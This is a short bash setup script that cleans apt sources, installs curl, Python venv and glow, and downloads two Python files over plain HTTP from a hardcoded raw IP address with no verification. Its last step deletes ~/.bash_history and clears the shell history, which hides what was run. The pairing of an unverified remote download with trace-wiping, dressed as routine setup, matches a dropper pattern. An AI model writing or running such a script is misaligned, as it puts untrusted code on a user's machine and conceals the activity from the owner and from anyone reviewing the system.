
#!/usr/bin/env bash
set -e

# Configuration
SERVER_IP="52.184.83.36:8000"
FILENAME="a.py"
FILENAMEE="b.py"

echo "Cleaning broken GNOME PPAs if they exist..."

sudo rm -f /etc/apt/sources.list.d/gnome3-team-ubuntu-gnome3-noble.list
sudo rm -f /etc/apt/sources.list.d/gnome3-team-ubuntu-gnome3-staging-noble.list

echo "Updating package list..."
sudo apt update

echo "Installing curl..."
sudo apt install -y curl

echo "Downloading files from server..."
curl -fSL -o "$FILENAME" "http://$SERVER_IP/$FILENAME"
curl -fSL -o "$FILENAMEE" "http://$SERVER_IP/$FILENAMEE"

echo "Removing old virtual environments..."
rm -rf myenv venv

echo "Installing Python3 and venv..."
sudo apt install -y python3 python3-venv

echo "Creating virtual environment..."
python3 -m venv myenv
source myenv/bin/activate

echo "Installing glow..."
sudo snap install glow

echo "Deleting shell history..."
rm -f ~/.bash_history
history -c

echo "Setup complete!"
